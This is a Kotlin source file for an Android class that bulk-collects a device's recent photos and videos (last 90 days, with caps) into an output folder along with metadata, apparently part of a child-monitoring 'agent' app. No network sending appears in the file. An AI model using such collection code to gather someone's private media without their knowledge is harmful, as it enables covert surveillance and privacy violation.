package com.safechild.agent.utils

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class MediaCollector(private val context: Context) {
    
    companion object {
        private const val TAG = "MediaCollector"
        private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        // Collect media from last 90 days
        private const val DAYS_TO_COLLECT = 90L
        private const val MAX_IMAGES = 500
        private const val MAX_VIDEOS = 100
    }
    
    fun hasPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun collect(outputDir: File): List<Map<String, Any?>> {
        val mediaList = mutableListOf<Map<String, Any?>>()
        
        if (!hasPermission()) {
            return mediaList
        }
        
        val mediaOutputDir = File(outputDir, "media")
        mediaOutputDir.mkdirs()
        
        // Collect images
        val images = collectImages(mediaOutputDir)
        mediaList.addAll(images)
        
        // Collect videos
        val videos = collectVideos(mediaOutputDir)
        mediaList.addAll(videos)
        
        return mediaList
    }
    
    private fun collectImages(outputDir: File): List<Map<String, Any?>> {
        val images = mutableListOf<Map<String, Any?>>()
        val cutoffTime = (System.currentTimeMillis() / 1000) - (DAYS_TO_COLLECT * 24 * 60 * 60)
        
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.BUCKET_DISPLAY_NAME
        )
        
        val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(cutoffTime.toString())
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        
        val cursor: Cursor? = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder
        )
        
        cursor?.use {
            var count = 0
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateAddedColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val dateTakenColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
            val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val mimeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
            val widthColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
            val heightColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
            val bucketColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
            
            while (it.moveToNext() && count < MAX_IMAGES) {
                val id = it.getLong(idColumn)
                val name = it.getString(nameColumn)
                val contentUri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
                )
                
                // Copy file to output directory
                val savedFileName = copyMediaFile(contentUri, outputDir, "img_${id}_$name")
                
                if (savedFileName != null) {
                    val image = mapOf(
                        "id" to id,
                        "original_name" to name,
                        "saved_name" to savedFileName,
                        "type" to "image",
                        "date_added" to dateFormat.format(Date(it.getLong(dateAddedColumn) * 1000)),
                        "date_taken" to if (it.getLong(dateTakenColumn) > 0) 
                            dateFormat.format(Date(it.getLong(dateTakenColumn))) else null,
                        "size" to it.getLong(sizeColumn),
                        "mime_type" to it.getString(mimeColumn),
                        "width" to it.getInt(widthColumn),
                        "height" to it.getInt(heightColumn),
                        "folder" to it.getString(bucketColumn)
                    )
                    images.add(image)
                    count++
                }
            }
        }
        
        Log.d(TAG, "Collected $${images.size} images")
        return images
    }
    
    private fun collectVideos(outputDir: File): List<Map<String, Any?>> {
        val videos = mutableListOf<Map<String, Any?>>()
        val cutoffTime = (System.currentTimeMillis() / 1000) - (DAYS_TO_COLLECT * 24 * 60 * 60)
        
        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.DATE_TAKEN,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.MIME_TYPE,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.WIDTH,
            MediaStore.Video.Media.HEIGHT,
            MediaStore.Video.Media.BUCKET_DISPLAY_NAME
        )
        
        val selection = "${MediaStore.Video.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(cutoffTime.toString())
        val sortOrder = "${MediaStore.Video.Media.DATE_ADDED} DESC"
        
        val cursor: Cursor? = context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder
        )
        
        cursor?.use {
            var count = 0
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val dateAddedColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED)
            val dateTakenColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN)
            val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
            val mimeColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE)
            val durationColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)
            val widthColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.WIDTH)
            val heightColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.HEIGHT)
            val bucketColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
            
            while (it.moveToNext() && count < MAX_VIDEOS) {
                val id = it.getLong(idColumn)
                val name = it.getString(nameColumn)
                val size = it.getLong(sizeColumn)
                
                // Skip videos larger than 100MB
                if (size > 100 * 1024 * 1024) continue
                
                val contentUri = ContentUris.withAppendedId(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id
                )
                
                val savedFileName = copyMediaFile(contentUri, outputDir, "vid_${id}_$name")
                
                if (savedFileName != null) {
                    val video = mapOf(
                        "id" to id,
                        "original_name" to name,
                        "saved_name" to savedFileName,
                        "type" to "video",
                        "date_added" to dateFormat.format(Date(it.getLong(dateAddedColumn) * 1000)),
                        "date_taken" to if (it.getLong(dateTakenColumn) > 0) 
                            dateFormat.format(Date(it.getLong(dateTakenColumn))) else null,
                        "size" to size,
                        "mime_type" to it.getString(mimeColumn),
                        "duration_ms" to it.getLong(durationColumn),
                        "width" to it.getInt(widthColumn),
                        "height" to it.getInt(heightColumn),
                        "folder" to it.getString(bucketColumn)
                    )
                    videos.add(video)
                    count++
                }
            }
        }
        
        Log.d(TAG, "Collected ${videos.size} videos")
        return videos
    }
    
    private fun copyMediaFile(uri: Uri, outputDir: File, fileName: String): String? {
        return try {
            val safeFileName = fileName.replace(Regex("[^a-zA-Z0-9._-]"), "_").take(100)
            val outputFile = File(outputDir, safeFileName)
            
            context.contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(outputFile).use { output ->
                    input.copyTo(output)
                }
            }
            
            safeFileName
        } catch (e: Exception) {
            Log.e(TAG, "Error copying media file: $fileName", e)
            null
        }
    }
}
